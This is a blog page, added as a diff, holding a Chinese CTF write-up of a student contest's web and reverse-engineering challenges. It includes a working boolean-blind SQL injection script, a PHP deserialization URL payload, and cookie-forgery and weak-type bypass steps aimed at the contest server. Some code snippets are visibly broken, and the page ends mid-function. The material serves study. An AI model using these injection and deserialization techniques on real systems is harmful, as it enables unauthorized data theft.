@@ -1,0 +1,1297 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="成都大学第二届“玄武杯”做题记录, F0und">
+    <meta name="description" content="第一部分 web大概看了下加上最后两天上的那一道题，本次web一共有九道题，题目不是很难（毕竟是面向19级新生的比赛），但还是记录一下，回忆一下上一年的惨痛经历….（被大佬打蒙了）。
+不要问为什么都是代码和文字，问就是图床没搭好，还在测试中">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>成都大学第二届“玄武杯”做题记录 | F0und</title>
+    <link rel="icon" type="image/png" href="/medias/fav.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">F0und</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">F0und</div>
+        <div class="logo-desc">
+            
+            今天不学习，明天变垃圾
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        成都大学第二届“玄武杯”做题记录
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web/" target="_blank">
+                                <span class="chip bg-color">web</span>
+                            </a>
+                        
+                            <a href="/tags/ctf/" target="_blank">
+                                <span class="chip bg-color">ctf</span>
+                            </a>
+                        
+                            <a href="/tags/reverse/" target="_blank">
+                                <span class="chip bg-color">reverse</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-11-17
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        2.6k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        11 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="第一部分-web"><a href="#第一部分-web" class="headerlink" title="第一部分 web"></a>第一部分 web</h1><p>大概看了下加上最后两天上的那一道题，本次web一共有九道题，题目不是很难（毕竟是面向19级新生的比赛），但还是记录一下，回忆一下上一年的惨痛经历….（被大佬打蒙了）。</p>
+<p>不要问为什么都是代码和文字，问就是图床没搭好，还在测试中…</p>
+<h2 id="weekpassword"><a href="#weekpassword" class="headerlink" title="weekpassword"></a>weekpassword</h2><p>这题从名字上看就知道是弱口令，直接百度弱口令TOP1000，放进Bp里面跑，跑出来00000就是密码，提交就有flag</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">flag{Fine_WeBsH3ll}
+</code></pre>
+<h2 id="serialization-1"><a href="#serialization-1" class="headerlink" title="serialization-1"></a>serialization-1</h2><p>php反序列化，，，记得当初第一次参见CTF的时候就是这道题不会做，导致就差这一道题没能拿奖</p>
+<p>题目地址： <a href="http://47.93.249.236:10009/index.php" target="_blank" rel="noopener">http://47.93.249.236:10009/index.php</a> </p>
+<pre class=" language-lang-php"><code class="language-lang-php"><?php
+error_reporting(0);
+class Test
+{
+    private $a = 'nothing';
+
+    public function __destruct()
+    {
+        if($this->a != 'nothing') {
+
+            highlight_file('flag.php');
+        }
+        else {
+            echo 'No Flag!';
+        }
+    }
+}
+
+if(isset($_GET['data'])) {
+    unserialize($_GET['data']);
+}
+else {
+    highlight_file(__FILE__);
+}
+    ?>
+</code></pre>
+<p>题目给了源代码，从代码中我们可以看出来，我们要拿到flag的话，必须让 <strong>a ! =’nothing’</strong></p>
+<p>但是 <strong>a</strong> 在声明的时候已经等于 <strong>nothing</strong> 了</p>
+<p>而我们能控制的参数只有 <strong>data</strong> </p>
+<pre class=" language-lang-php"><code class="language-lang-php">unserialize($_GET['data']);
+</code></pre>
+<p>从这里我们看到我们传入的<strong>data</strong>参数会被<strong>unserialize()</strong> 这个函数处理</p>
+<p>看一下 <strong>unserialize（）</strong> 这个函数的作用</p>
+<p> <strong>将已序列化的字符串变回 PHP 的值</strong> </p>
+<p>这就很清晰明了了</p>
+<p>我们可以通过data传入一个已经序列化的字符串来覆盖掉 <strong>a</strong> 的值</p>
+<pre class=" language-lang-php"><code class="language-lang-php"><?php
+
+    class Test{
+    private $a = "666";
+    }
+    $flag = new Test();
+    print_r(serialize($flag));
+
+?>
+</code></pre>
+<p>执行这段代码后得到</p>
+<pre class=" language-lang-php"><code class="language-lang-php">O:4:"Test":1:{s:7:"Testa";s:3:"666";}
+</code></pre>
+<p>但这还不够</p>
+<pre class=" language-lang-php"><code class="language-lang-php">O:4:"Test":1:{s:7:"%00Test%00a";s:3:"666";}
+</code></pre>
+<p>由于变量 <strong>a</strong> 的类型为 <strong>private</strong></p>
+<p>因此我们需要在类名 <strong>Test</strong> 前面加上 <strong>%00</strong> </p>
+<p>具体要参考这篇文章  <a href="https://blog.csdn.net/qq_42196196/article/details/81217375" target="_blank" rel="noopener">https://blog.csdn.net/qq_42196196/article/details/81217375</a> （HITCON 2016一道web）</p>
+<p>因此我们最终的payload为：</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">http://47.93.249.236:10009/index.php?data=O:4:%22Test%22:1:{s:7:%22%00Test%00a%22;s:3:%22666%22;}
+</code></pre>
+<p>访问得到 <strong>flag</strong></p>
+<pre class=" language-lang-php"><code class="language-lang-php"><?php
+$flag = 'flag{0030-0571-8890-4673}';
+?>
+</code></pre>
+<h2 id="百度"><a href="#百度" class="headerlink" title="百度"></a>百度</h2><p>这道题从名字上就可以知道（zuo ti zuo duo le jiu ke yi zhi dao）,关键在<strong>robots.txt</strong> 上，一般情况下网站都会有这个文件，他的主要功能就和他的文件内容 一样清晰明了</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">User-agent: *
+Disallow:
+</code></pre>
+<p>主要是来防爬虫，在真实的渗透测试案例中经常会出现，比如用来找<strong>admin</strong> 界面….</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">flag{BoBo-RoRo-ToTo}
+</code></pre>
+<p>还有别的不想被爬取到的页面，具体可以看百度上的的robots.txt</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">https://www.baidu.com/robots.txt
+</code></pre>
+<h2 id="SQL-1"><a href="#SQL-1" class="headerlink" title="SQL-1"></a>SQL-1</h2><p>题如其名，MySQL注入中的bool盲注</p>
+<p>这道题用 sqlmap 就可以做，工具固然好用，但拒绝做脚本小子</p>
+<p>但本着学习的精神，主要是好久不用<strong>python</strong>了</p>
+<p>就写了一个简单的脚本 (python2.7)</p>
+<pre class=" language-lang-python"><code class="language-lang-python">import requests
+
+def login(_username,_password):
+    url="http://47.93.249.236:10001/index.php"
+    data={
+        "username":_username,
+        "password":_password
+    }
+    response=requests.post(url,data=data)
+    content=response.content
+    if "Login Success!" in content:
+        return True
+    else:
+        return False
+
+def find_dblen():
+    for i in range(10):
+        _username = "admin' and (length(database())) = %d #" % (i)
+        _password = "admin"
+        if login(_username, _password):
+            print _username
+            return i
+
+
+def find_dbname():
+    find_name = ""
+    length=find_dblen()+1
+    for i in range(length):
+        for j in range(0x80, 0x20, -1):
+            _username = "admin' and (ascii(substr(database(),%d,%d))=%d) #"%(i,i,j)
+            _password = "admin"
+            if login(_username, _password):
+                print _username
+                find_name += chr(j)
+                print find_name
+                break
+def find_dbtable_len():
+    for i in range(100):
+        _username = "admin' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,2)=%d #" % (i)
+        _password = "admin"
+        if login(_username, _password):
+            print _username
+            return i
+def find_dbtable_name():
+    find_name = ""
+    length=find_dbtable_len()+1
+    for i in range(length):
+        for j in range(0x80, 0x20, -1):
+            _username = "admin' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,%d)))=%d #"%(i,i,j)
+            _password = "admin"
+            if login(_username, _password):
+                print _username
+                find_name += chr(j)
+                print find_name
+                break
+def find_dbcolum_len():
+    for i in range(10):
+        _username = "admin' and (select length(column_name) from information_schema.columns where table_name=0x7573657273 limit 0, 1) = %d #" % (i)
+        _password = "admin"
+        if login(_username, _password):
+            print _username
+            return i
+
+def find_dbcolum_name():
+    find_name = ""
+    for i in range(9):
+        for j in range(0x80, 0x20, -1):
+            _username = "admin' and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),%d,%d))=%d #"%(i,i,j)
+            _password = "admin"
+            if login(_username, _password):
+                print _username
+                find_name += chr(j)
+                print find_name
+                break
+def find_flag():
+    find_name = ""
+    for i in range(40):
+        for j in range(0x80, 0x20, -1):
+            _username = "admin' and (ascii(substr((select password from users limit 0,1),%d,%d)))=%d #"%(i,i,j)
+            _password = "admin"
+            if login(_username, _password):
+                print _username
+                find_name += chr(j)
+                print find_name
+                break
+
+if __name__ == '__main__':
+    find_flag()
+</code></pre>
+<pre class=" language-lang-txt"><code class="language-lang-txt">flag{sql1-wArn1ng}
+</code></pre>
+<pre class=" language-lang-txt"><code class="language-lang-txt">#sql盲注注入流程:一、猜数据库的长度    √ 4
+#              二、猜数据库的名字    √ mydb
+#              三、猜数据库中数据表的名字的长度 √ 第一个表的长度是5
+#              四、猜数据库中数据表的名字  表名为 users
+#              五、猜数据库中数据表中列的数量 √ 3
+#              六、猜数据库中数据表中列的名字 √ id username password
+#              七、猜数据库中数据表中列中字段的数量
+#              八、猜数据库中数据表中列中字段的名字
+</code></pre>
+<p>上面是总结的一些东西，可能还不够完善</p>
+<h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><p>这道题主要是想考察hash的长度扩展攻击，可能是出于对新生的照顾，下降了难度</p>
+<p>题目源码</p>
+<pre class=" language-lang-php"><code class="language-lang-php">function ctt($key)
+{
+    $t="";
+    for($i=0;$i < strlen($key) ; ++$i)
+    {
+        $t.=chr(ord($key[$i])^$i);
+    }
+    return $t;
+}
+$auth = false;
+$role1 = "xxxxxxxxx";
+$salt = "xxxxxxxxxx";//长度不超过15
+if (isset($_COOKIE["role_true"])) {
+      $hsh = $_COOKIE["hsh"];
+      if ($_COOKIE["role_true"] === $role1 && $hsh   ===md5($salt.urldecode($_COOKIE["role"]))) {
+    $auth = true;
+} else {
+    $auth = false;
+ }
+ } else {
+    $s =$role1;
+    setcookie('role',ctt(base64_encode($s)));            
+    $hsh = md5($salt.ctt(base64_encode($s)));
+    setcookie('hsh',$hsh);
+ }
+   if ($auth) {
+   echo "Welcome Admin. Your flag is ";
+} else {
+   echo "Only True Admin can see the flag!!";
+ }
+</code></pre>
+<p>从代码中我们可以看出，我们要想输出 <strong>flag</strong> 必须要满足</p>
+<pre class=" language-lang-php"><code class="language-lang-php">$_COOKIE["role_true"] === $role1 && $hsh === md5($salt.urldecode($_COOKIE["role"]))
+</code></pre>
+<p>通过F12查看源代码 我们可以得到 </p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">role=YVPweR3oRN%3B%7Bnj32
+hsh=5beee4019e55f453db9daf0df7d90879
+</code></pre>
+<p>分析代码写脚本解出 role</p>
+<p>脚本 (需要先解出 <strong>url解码之后的role</strong> )</p>
+<pre class=" language-lang-python"><code class="language-lang-python">import base64
+
+def dctt(key):
+    t=''
+    for i in range(len(key)):
+        t = t + chr(ord(key[i]) ^ i)
+    result = base64.b64decode(t)
+    return result
+
+if __name__ == '__main__':
+    key = "YVPweR3oRN;{nj32"
+    print dctt(key)
+</code></pre>
+<pre class=" language-lang-txt"><code class="language-lang-txt">role=adminadmin
+</code></pre>
+<p>因此我们现在只需要让</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">role_true=adminadmin
+</code></pre>
+<p>就可以得出 <strong>flag</strong> </p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">flag{hash_and_php_are_very_good!!!}
+</code></pre>
+<h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>这题可能有问题…</p>
+<pre class=" language-lang-php"><code class="language-lang-php">no 
+include('flag.php');
+$f1 = @$_GET['f1'];
+$f2 = @$_POST['f2'];
+$f3 = @$_COOKIE['f3'];
+
+if($f2 !== '0') {
+    echo 'no';
+}
+else {
+    if($f1 == 0 and $f1 !== 0) {
+        $f2 == $f3;
+        if(md5($f2) == 0 and $f2 == 0) {
+            echo $flag;
+        }
+    }
+}
+</code></pre>
+<p>还是先分析一下代码</p>
+<p>首先 我们需要通过 GET 方式传入 f1 , POST 方式传入 f2 ,和在 cookie 中设置 f3</p>
+<p>其次首先要满足 （依次）</p>
+<pre class=" language-lang-php"><code class="language-lang-php">f2===0
+</code></pre>
+<pre class=" language-lang-php"><code class="language-lang-php">f1=0 f1!==0
+</code></pre>
+<pre class=" language-lang-php"><code class="language-lang-php">md5(f2)==0&&f2=0
+</code></pre>
+<p>但实际过程发现，我们只要让</p>
+<pre class=" language-lang-php"><code class="language-lang-php">f1=0abc //php是弱类型语言，会将 '0abc'看成 '0'
+</code></pre>
+<pre class=" language-lang-php"><code class="language-lang-php">f2=0
+</code></pre>
+<p>就可以得出flag</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">flag{Due_to_weak_type:)}
+</code></pre>
+<p>但其实我们还要传入</p>
+<pre class=" language-lang-php"><code class="language-lang-php">f3[]=0
+</code></pre>
+<p>来绕过</p>
+<pre class=" language-lang-php"><code class="language-lang-php">md5(f2)==0&&f2=0
+</code></pre>
+<p>可能是出题人疏忽了…,或者我想多了….</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">flag{Due_to_weak_type:)}
+</code></pre>
+<h2 id="有趣的上传点"><a href="#有趣的上传点" class="headerlink" title="有趣的上传点"></a>有趣的上传点</h2><p>确实有趣，一点思路没有，上传过去文件就没了，访问也访问不到，用工具扫出来了XSS，但用不了…</p>
+<p>真的不会写，也没人做出来，赛后看官方WP后在写一篇专门关于这个题的吧</p>
+<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p>POST传参数，用火狐的hackbar或者Bp抓包改请求方式都可以</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">flag{Tw0~E4sy-pHp}
+</code></pre>
+<h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p>GET传参数，直接在URL后面写就行</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">flag{A~E4sy-pHp}
+</code></pre>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>web部分到这里就完了，每道题都不是很难，关键是找里面的知识点来学，难的题也不过就是把一些简单的知识点给集合起来，关于GET,POST请求部分的东西我会放在GO Web学习当中来讨论。</p>
+<h1 id="第二部分-Reverse"><a href="#第二部分-Reverse" class="headerlink" title="第二部分 Reverse"></a>第二部分 Reverse</h1><p>这一部分总共有5道题，除了点击一千次有点废百度之外，其他的题都还是很基础的</p>
+<h2 id="Android-Studio-Usage"><a href="#Android-Studio-Usage" class="headerlink" title="Android Studio Usage"></a>Android Studio Usage</h2><p>安卓逆向题，主要考察的就是安卓程序的结构，但flag 一开始给错了，加上那个hanhan的函数让我觉得我也找错了，直到flag改了回来。我人傻了，我就是个hanhan,还下了Android Studio来找，找来找去也就那一串…..</p>
+<p>不多说了，先放一下Android 程序的结构</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">EMMM,图床没搭好先不放了，
+</code></pre>
+<p>根据结构我们可以知道主程序的位置就在</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">\MyApplication\app\src\main\java\
+</code></pre>
+<p>里面，而里面只有一个hanhan.java</p>
+<p>里面的内容是</p>
+<pre class=" language-lang-java"><code class="language-lang-java">import java.util.Scanner;
+
+public class hanhan {
+
+    public static void main(String[] args) {
+        // TODO Auto-generated method stub
+        Scanner in =new Scanner(System.in);
+        String yours;
+        String people="ZmxhZ3tZb3UgYXJlIHNpbXBsZSBhbmQgaG9uZXN0fQ==";
+
+
+    }
+
+}
+</code></pre>
+<p>那  flag 就显而易见了，</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">flag{You are simple and honest}
+</code></pre>
+<h2 id="猜数？"><a href="#猜数？" class="headerlink" title="猜数？"></a>猜数？</h2><p>IDA 源代码（64位）分析 发现</p>
+<pre class=" language-lang-c"><code class="language-lang-c">#include<studio.h>
+
+int main(){
+
+  int result; // eax@4
+  __int64 v4; // rsi@4
+  __int64 v5; // [sp+8h] [bp-38h]@1
+  __int64 v6; // [sp+10h] [bp-30h]@1
+  __int64 v7; // [sp+18h] [bp-28h]@1
+  __int64 v8; // [sp+20h] [bp-20h]@1
+  __int64 v9; // [sp+28h] [bp-18h]@1
+  __int64 v10; // [sp+30h] [bp-10h]@1
+  __int64 v11; // [sp+38h] [bp-8h]@1
+
+  v11 = *MK_FP(__FS__, 40LL);
+  v5 = 0LL;
+  srand(10520);
+  v6 = rand() % 10520;
+  v7 = rand() % 10520;
+  v8 = rand() % 10520;
+  v9 = rand() % 10520;
+  v10 = v8 + v7 + v6 + v9;
+  printf("Input your key:", argv);
+  __isoc99_scanf("%ld", &v5);
+  if ( v10 == v5 )
+    printf("flag{cdusec_wsj_%ld}", v5);
+  else
+    printf("wrong!");
+  result = 0;
+  v4 = *MK_FP(__FS__, 40LL) ^ v11;
+
+  return 0;
+}
+</code></pre>
+<p>大概就是我们需要输入一个数，并且这个数要等于<strong>v10</strong> 也就是四个随机的数相加</p>
+<p>我们发现<strong>srand()</strong>函数中只有一个参数</p>
+<p>众所周知，当<strong>srand()</strong> 函数里只有一个参数的时候会生成伪随机数</p>
+<p>伪随机数也就是当<strong>srand()</strong>这个函数里的参数确定了以后，生成的随机数将不会发生改变</p>
+<p>知道了这个原理以后，我们编写脚本</p>
+<pre class=" language-lang-c"><code class="language-lang-c">#include<stdio.h>
+
+int main(){
+    int v6,v7,v8,v9;
+    int result;
+    srand(10520);
+    v6 = rand() % 10520;
+    v7 = rand() % 10520;
+    v8 = rand() % 10520;
+    v9 = rand() % 10520;
+    result=v6+v7+v8+v9;
+    printf("%ld",result);
+    return 0
+}
+</code></pre>
+<p>值得一提的是这个程序在linux下运行和在windows下运行结果是不一样的</p>
+<p>命令：</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">gcc -o flag flag.c
+./flag
+</code></pre>
+<p>这也是为什么他叫linux的原因吧</p>
+<p>结果：</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">23231
+</code></pre>
+<pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusec_wsj_23231}
+</code></pre>
+<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><p>这道题比较简单直接给了一个可以运行的python文件（python3.x）</p>
+<pre class=" language-lang-python"><code class="language-lang-python">print("Plase input your flag:")
+b=b'\x65\x6f\x62\x64\x78\x60\x67\x76\x70\x66\x60\x5c\x71\x66\x60\x31\x5c\x66\x62\x70\x7a\x7e'
+a= input()
+a=a.encode()
+c=''
+for i in a:
+    #print(i)
+    c=c+chr(i^3)
+#print(c)
+
+if(c.encode()==b):
+    print("youare right:")
+    print(a)
+else:
+    print("wrong!")
+</code></pre>
+<p>这就简单了，一顿分析之后</p>
+<p>直接修改脚本</p>
+<pre class=" language-lang-python"><code class="language-lang-python">print("Plase input your flag:")
+b=b'\x65\x6f\x62\x64\x78\x60\x67\x76\x70\x66\x60\x5c\x71\x66\x60\x31\x5c\x66\x62\x70\x7a\x7e'
+c=''
+for i in b:
+    c=c+chr(i^3)
+print(c)
+</code></pre>
+<pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusec_rec2_easy}
+</code></pre>
+<h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>IDA中F5查看伪代码（32位）</p>
+<pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  signed int v3; // esi@1
+  signed int v4; // ecx@1
+  int result; // eax@11
+  char v6; // [sp+8h] [bp-8h]@1
+  char v7; // [sp+9h] [bp-7h]@4
+  char v8; // [sp+Ah] [bp-6h]@4
+  char v9[5]; // [sp+Bh] [bp-5h]@4
+
+  v3 = 1;
+  printf(Format);
+  scanf(aS, &v6);
+  v4 = 0;
+  do
+  {
+    if ( v4 % 4 )
+      goto LABEL_9;
+    if ( !(v4 / 4) )
+    {
+      if ( *(&v6 + v4) + ((*(&v7 + v4) + ((*(&v8 + v4) + (v9[v4] << 8)) << 8)) << 8) == 1937073251 )
+        goto LABEL_9;
+LABEL_8:
+      v3 = 0;
+      goto LABEL_9;
+    }
+    if ( v4 / 4 == 1 && *(&v6 + v4) + ((*(&v7 + v4) + ((*(&v8 + v4) + (v9[v4] << 8)) << 8)) << 8) != 1701995365 )
+      goto LABEL_8;
+LABEL_9:
+    ++v4;
+  }
+  while ( v4 < 8 );
+  if ( v3 == 1 )
+  {
+    printf(aFlagS_1, &v6);
+    result = system(Command);
+  }
+  else
+  {
+    printf(aWrongKey);
+    result = system(Command);c
+  }
+  return result;
+}
+</code></pre>
+<p>发现flag的前四位要满足</p>
+<pre class=" language-lang-c"><code class="language-lang-c">*(&v6 + v4) + ((*(&v7 + v4) + ((*(&v8 + v4) + (v9[v4] << 8)) << 8)) << 8) == 1937073251
+</code></pre>
+<p>后四位要满足</p>
+<pre class=" language-lang-c"><code class="language-lang-c">*(&v6 + v4) + ((*(&v7 + v4) + ((*(&v8 + v4) + (v9[v4] << 8)) << 8)) << 8) != 1701995365
+</code></pre>
+<p>也就是说flag总共有8位</p>
+<p>先来一手猜flag</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">cdus ecre
+</code></pre>
+<p>刚好八位（手动斜眼笑）</p>
+<p>成功得到flag</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusecre_1}
+</code></pre>
+<p>开个玩笑，这题还是要写脚本的</p>
+<p>取出表达式</p>
+<pre class=" language-lang-c"><code class="language-lang-c">v1 + (( v2 + ((v3 + (v4 << 8)) << 8)) << 8) == 1937073251
+v5 + (( v6 + ((v7 + (v8 << 8)) << 8)) << 8) == 1937073251
+</code></pre>
+<pre class=" language-lang-python"><code class="language-lang-python">flag='qwertyuiopasdfghjklzxcvbnm'
+def run(number):
+    for a in range flag:
+        for b in range flag:
+            for c in range flag:
+                for d in range flag:
+                    if ord(a)+ord(b)+ord(c)+ord(d)=number:
+                        print a+b+c+d
+run()
+</code></pre>
+<pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusecre_1}
+</code></pre>
+<h2 id="点击1000次"><a href="#点击1000次" class="headerlink" title="点击1000次"></a>点击1000次</h2><p>如果说re里边最难的那一个的话，那应该就是这道题了，出题人给的hint建议是用ollydbg做，没学过，花了半天的时间学了一下，然后开始本题</p>
+<p>题目上写的是点击1000次给一个flag字符，童叟无欺。</p>
+<p>先用IDA 查看伪代码(32位)</p>
+<pre class=" language-lang-c"><code class="language-lang-c">int sub_401277()
+{
+  int result; // eax@3
+  unsigned __int8 *v1; // [sp+0h] [bp-8h]@1
+  void *lpMem; // [sp+4h] [bp-4h]@1
+
+  lpMem = (void *)sub_4015F2(1, ++dword_4A32C0);
+  v1 = (unsigned __int8 *)sub_40121B((unsigned int)&unk_480B5F);
+  if ( lpMem )
+    sub_4015FE(lpMem);
+  result = sub_4015F8((HWND)0x52010001, 100728832, 8, -1, v1, 0);
+  if ( v1 )
